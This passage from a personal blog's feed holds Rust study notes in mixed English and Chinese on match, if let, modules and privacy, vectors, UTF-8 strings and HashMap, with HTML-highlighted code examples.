&#123;</span><br><span class="line">    value_in_cents(Coin::Quarter(UsState::Alaska));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用option<t><br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    fn plus_one(x: Option&lt;i32&gt;) -&gt; Option&lt;i32&gt; &#123;</span><br><span class="line">        match x &#123;</span><br><span class="line">            None =&gt; None,</span><br><span class="line">            Some(i) =&gt; Some(i + <span class="number">1</span>),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let five = Some(<span class="number">5</span>);</span><br><span class="line">    let six = plus_one(five);</span><br><span class="line">    let none = plus_one(None);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></t></p><p><code>Combining match and enums</code> is useful in many situations.<br>match against an enum, <code>bind a variable to the data inside,</code> and then execute code based on it.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let some_u8_value = 0u8;</span><br><span class="line">    match some_u8_value &#123;</span><br><span class="line">        <span class="number">1</span> =&gt; println!(<span class="string">"one"</span>),</span><br><span class="line">        <span class="number">3</span> =&gt; println!(<span class="string">"three"</span>),</span><br><span class="line">        <span class="number">5</span> =&gt; println!(<span class="string">"five"</span>),</span><br><span class="line">        <span class="number">7</span> =&gt; println!(<span class="string">"seven"</span>),</span><br><span class="line">        _ =&gt; (),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_</code>省略The _ pattern will match any value.<code>The () is just the unit value</code></p><h3 id="if-let"><a href="#if-let" class="headerlink" title="if let"></a>if let</h3><p>care about only one of the cases. For this situation, Rust provides if let.<br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let some_u8_value = Some(0u8);</span><br><span class="line">    <span class="keyword">if</span> let Some(<span class="number">3</span>) = some_u8_value &#123;</span><br><span class="line">        println!(<span class="string">"three"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let coin = Coin::Penny;</span><br><span class="line">    let mut count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> let Coin::Quarter(state) = coin &#123;</span><br><span class="line">        println!(<span class="string">"State quarter from &#123;:?&#125;!"</span>, state);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        count += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let coin = Coin::Penny;</span><br><span class="line">    let mut count = <span class="number">0</span>;</span><br><span class="line">    match coin &#123;</span><br><span class="line">        Coin::Quarter(state) =&gt; println!(<span class="string">"State quarter from &#123;:?&#125;!"</span>, state),</span><br><span class="line">        _ =&gt; count += <span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="packages-gt-crates-gt-modules"><a href="#packages-gt-crates-gt-modules" class="headerlink" title="packages&gt;crates&gt;modules"></a>packages&gt;crates&gt;modules</h3><p> A package is<code>one or more crates</code>that provide a set of functionality. A package contains a Cargo.toml file that describes how to build those crates.<br>A package must contain zero or one library crates, and no more. It can contain as many binary crates as you’d like, but it must <code>contain at least one crate</code> (either library or binary).<br>If a package <code>contains src/main.rs and src/lib.rs, it has two crates: a library and a binary,</code> both with the same name as the package.<br>A package can<code>have multiple binary crates by placing files in the src/bin directory:</code>each file will be a separate binary crate.</p><p>the <code>use</code> keyword that brings a path into scope; and the <code>pub</code> keyword to make items public. We’ll also discuss the as keyword, external packages, and the glob operator</p><p>Modules let us organize code within a crate into groups</p><p>Create a new library named restaurant by running <code>cargo new --lib</code>restaurant;<br>crate //implicit module  src/main.rs and src/lib.rs 产生<br> └── front_of_house<br>     ├── hosting<br>     │   ├── add_to_waitlist<br>     │   └── seat_at_table<br>     └── serving<br>         ├── take_order<br>         ├── serve_order<br>         └── take_payment</p><p> If we want to call a function, we need to know its path.<br>A path can take two forms:</p><p>An <code>absolute path</code> starts from a crate root by using a crate name or a literal crate.<br>A <code>relative path</code>starts from the current module and uses self, super, or an identifier in the current module.<br>Both absolute and relative paths are followed by one or more identifiers separated by double colons (<code>::</code>).</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mod front_of_house &#123;</span><br><span class="line">    mod hosting &#123;</span><br><span class="line">        fn add_to_waitlist() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    // Absolute path</span><br><span class="line">    crate::front_of_house::hosting::add_to_waitlist();</span><br><span class="line"></span><br><span class="line">    // Relative path</span><br><span class="line">    front_of_house::hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The way privacy works in Rust is that all items (<code>functions, methods, structs, enums, modules, and constants) are private by default</code>.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mod front_of_house &#123;</span><br><span class="line">    pub mod hosting &#123;</span><br><span class="line">        pub fn add_to_waitlist() &#123;&#125; //making the module public doesn’t make its contents public. </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    // Absolute path</span><br><span class="line">    crate::front_of_house::hosting::add_to_waitlist();</span><br><span class="line"></span><br><span class="line">    // Relative path</span><br><span class="line">    front_of_house::hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn serve_order() &#123;&#125;</span><br><span class="line"></span><br><span class="line">mod back_of_house &#123;</span><br><span class="line">    fn fix_incorrect_order() &#123;</span><br><span class="line">        cook_order();</span><br><span class="line">        super::serve_order();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fn cook_order() &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> Enums aren’t very useful unless their variants are public; it would be annoying to have to annotate all enum variants with pub in every case, so the <code>default for enum variants is to be public.</code>Structs are often useful without their fields being public, so struct fields follow the general rule of <code>everything being private by default</code> unless annotated with pub.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">use</span><br><span class="line">mod front_of_house &#123;</span><br><span class="line">    pub mod hosting &#123;</span><br><span class="line">        pub fn add_to_waitlist() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">use crate::front_of_house::hosting;</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mod front_of_house &#123;</span><br><span class="line">    pub mod hosting &#123;</span><br><span class="line">        pub fn add_to_waitlist() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">use self::front_of_house::hosting;</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="as"><a href="#as" class="headerlink" title="as"></a>as</h3><p>There’s another solution to the problem of bringing two types of the same name into the same scope with use: after the path, we can specify <code>as and a new local name</code>, or alias, for the type.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">![allow(unused_variables)]</span><br><span class="line">fn main() &#123;</span><br><span class="line">use std::fmt::Result;</span><br><span class="line">use std::io::Result as IoResult;</span><br><span class="line"></span><br><span class="line">fn function1() -&gt; Result &#123;</span><br><span class="line">    // --snip--</span><br><span class="line">    Ok(())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn function2() -&gt; IoResult&lt;()&gt; &#123;</span><br><span class="line">    // --snip--</span><br><span class="line">    Ok(())</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>this technique is called re-exporting because we’re bringing an item into scope but also making that item available for others to bring into their scope<br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mod front_of_house &#123;</span><br><span class="line">    pub mod hosting &#123;</span><br><span class="line">        pub fn add_to_waitlist() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub use crate::front_of_house::hosting;  //其他可以 另外创立一个链接</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">use std::collections::HashMap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>This is an absolute path starting with std, the name of the standard library crate.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">use rand::Rng;</span><br><span class="line">// --snip--</span><br><span class="line">use std::&#123;cmp::Ordering, io&#125;;</span><br><span class="line">// --snip--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">use std::io::&#123;self, Write&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">use std::collections::*;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> brings all public items </p><p>The <code>mod</code> keyword declares modules, and Rust looks in a file with the same name as the module for the code that goes into that module.</p><h3 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h3><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let v: Vec&lt;i32&gt; = Vec::new();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let v = vec![<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]; //类别自己推测</span><br><span class="line">&#125;</span><br><span class="line">fn main() &#123;</span><br><span class="line">    let mut v = Vec::new();</span><br><span class="line"></span><br><span class="line">    v.push(<span class="number">5</span>);</span><br><span class="line">    v.push(<span class="number">6</span>);</span><br><span class="line">    v.push(<span class="number">7</span>);</span><br><span class="line">    v.push(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">fn main() &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        let v = vec![<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">        // do stuff with v</span><br><span class="line">    &#125; // &lt;- v goes out of scope and is freed here</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let v = vec![<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">    let third: &amp;i32 = &amp;v[<span class="number">2</span>];</span><br><span class="line">    println!(<span class="string">"The third element is &#123;&#125;"</span>, third);</span><br><span class="line"></span><br><span class="line">    match v.get(<span class="number">2</span>) &#123; //gives us an Option&lt;&amp;<span class="literal">T</span>&gt;.</span><br><span class="line">        Some(third) =&gt; println!(<span class="string">"The third element is &#123;&#125;"</span>, third),</span><br><span class="line">        None =&gt; println!(<span class="string">"There is no third element."</span>),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let mut v = vec![<span class="number">100</span>, <span class="number">32</span>, <span class="number">57</span>];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> &amp;mut v &#123;</span><br><span class="line">        *i += <span class="number">50</span>; //解引用 dereference operator (*) to get to the value <span class="keyword">in</span> i</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    enum SpreadsheetCell &#123;</span><br><span class="line">        Int(i32),</span><br><span class="line">        Float(f64),</span><br><span class="line">        Text(String),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let row = vec![  //vec类型为SpreadsheetCell 实际上存储不同类型值</span><br><span class="line">        SpreadsheetCell::Int(<span class="number">3</span>),</span><br><span class="line">        SpreadsheetCell::Text(String::from(<span class="string">"blue"</span>)),</span><br><span class="line">        SpreadsheetCell::Float(<span class="number">10.12</span>),</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>枚举要配合match使用</p><h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p>Remember that<code>strings are UTF-8</code>encoded,<br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let hello = String::from(<span class="string">"السلام عليكم"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"Dobrý den"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"Hello"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"שָׁלוֹם"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"नमस्ते"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"こんにちは"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"안녕하세요"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"你好"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"Olá"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"Здравствуйте"</span>);</span><br><span class="line">    let hello = String::from(<span class="string">"Hola"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">"foo"</span>);</span><br><span class="line">    s.push_str(<span class="string">"bar"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">"lo"</span>);</span><br><span class="line">    s.push(<span class="string">'l'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>push method takes<code>a single character</code></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let s1 = String::from(<span class="string">"Hello, "</span>);</span><br><span class="line">    let s2 = String::from(<span class="string">"world!"</span>);</span><br><span class="line">    let s3 = s1 + &amp;s2; // note s1 has been moved here and can no longer be used//be moved into the add call and no longer be valid after that.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> add is that the compiler can coerce the &amp;String argument into a &amp;str</p><h4 id="format"><a href="#format" class="headerlink" title="format"></a>format</h4><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let s1 = String::from(<span class="string">"tic"</span>);</span><br><span class="line">    let s2 = String::from(<span class="string">"tac"</span>);</span><br><span class="line">    let s3 = String::from(<span class="string">"toe"</span>);</span><br><span class="line"></span><br><span class="line">    let s = format!(<span class="string">"&#123;&#125;-&#123;&#125;-&#123;&#125;"</span>, s1, s2, s3); //doesn’t take ownership of any of its parameters.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>utf-8</code>可变字节 1-4字节，有些一个字节 有些4个字节</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[allow(unused_variables)]</span><br><span class="line">fn main() &#123;</span><br><span class="line">let hello = <span class="string">"Здравствуйте"</span>;</span><br><span class="line"></span><br><span class="line">let s = &amp;hello[<span class="number">0.</span><span class="number">.4</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">"नमस्ते"</span>.chars() &#123;</span><br><span class="line">    println!(<span class="string">"&#123;&#125;"</span>, c);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">"नमस्ते"</span>.bytes() &#123; // returns each raw byte,</span><br><span class="line">    println!(<span class="string">"&#123;&#125;"</span>, b);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="hashmap"><a href="#hashmap" class="headerlink" title="hashmap"></a>hashmap</h3><p><code>all of the keys</code> must have the<code>same type</code>, and all of the<code>values</code>must have the<code>same type.</code><br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line">    let mut scores = HashMap::new();</span><br><span class="line">    scores.insert(String::from(<span class="string">"Blue"</span>), <span class="number">10</span>);</span><br><span class="line">    scores.insert(String::from(<span class="string">"Yellow"</span>), <span class="number">50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line"></span><br><span class="line">    let teams = vec![String::from(<span class="string">"Blue"</span>), String::from(<span class="string">"Yellow"</span>)];</span><br><span class="line">    let initial_scores = vec![<span class="number">10</span>, <span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    let mut scores: HashMap&lt;_, _&gt; =</span><br><span class="line">        teams.into_iter().zip(initial_scores.into_iter()).collect();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>zip</code>method to create a vector of tuples<br><code>collect</code>method to turn that vector of tuples into a hash map,</p><p>For types that implement the <code>Copy trait</code>, like i32, the values<code>are copied into</code> the hash map. For owned values like String, the values will be moved and the hash map will be the <code>owner of those values</code></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line"></span><br><span class="line">    let mut scores = HashMap::new();</span><br><span class="line"></span><br><span class="line">    scores.insert(String::from(<span class="string">"Blue"</span>), <span class="number">10</span>);</span><br><span class="line">    scores.insert(String::from(<span class="string">"Yellow"</span>), <span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">    let team_name = String::from(<span class="string">"Blue"</span>);</span><br><span class="line">    let score = scores.get(&amp;team_name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Some(&amp;10). The result is wrapped in Some because get returns an Option&lt;&amp;V&gt;<br>no value get will return None.</p><pre><code>for (key, value) in &amp;scores {    println!(&quot;{}: {}&quot;, key, value);}</code></pre><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line"></span><br><span class="line">    let mut scores = HashMap::new();</span><br><span class="line">    scores.insert(String::from(<span class="string">"Blue"</span>), <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    scores.entry(String::from(<span class="string">"Yellow"</span>)).or_insert(<span class="number">50</span>);  //entry检查值是否存在，返回Entry， or_insert是Entry的方法 <span class="keyword">return</span> a mutable reference to the value   没有值插入</span><br><span class="line">    scores.entry(String::from(<span class="string">"Blue"</span>)).or_insert(<span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">"&#123;:?&#125;"</span>, scores); //&#123;<span class="string">"Yellow"</span>: <span class="number">50</span>, <span class="string">"Blue"</span>: <span class="number">10</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line"></span><br><span class="line">    let text = <span class="string">"hello world wonderful world"</span>;</span><br><span class="line"></span><br><span class="line">    let mut map = HashMap::new();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> text.split_whitespace() &#123;</span><br><span class="line">        let count = map.entry(word).or_insert(<span class="number">0</span>); //or_insert method actually returns a mutable reference (&amp;mut V) 所以可以加<span class="number">1</span></span><br><span class="line">        *count += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">"&#123;:?&#125;"</span>, map);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Debug&quot;&gt;&lt;a href=&quot;#Debug&quot; class=&quot;headerlink&quot; title=&quot;Debug&quot;&gt;&lt;/a&gt;Debug&lt;/h3&gt;&lt;p&gt;The &lt;code&gt;Debug trait&lt;/code&gt;enables us to print our struct in a way that is useful for developers so we can see its value while we’re debugging our code.&lt;br&gt;
    
    </summary>
    
    
      <category term="RUST" scheme="http://finsenty54.github.io/tags/RUST/"/>
    
  </entry>
  
  <entry>
    <title>RUST学习2</title>
    <link href="http://finsenty54.github.io/2020/07/29/RUST%E5%AD%A6%E4%B9%A02/"/>
    <id>http://finsenty54.github.io/2020/07/29/RUST学习2/</id>
    <published>2020-07-29T01:33:06.000Z</published>
    <updated>2020-07-29T01:34:09.636Z</updated>
    
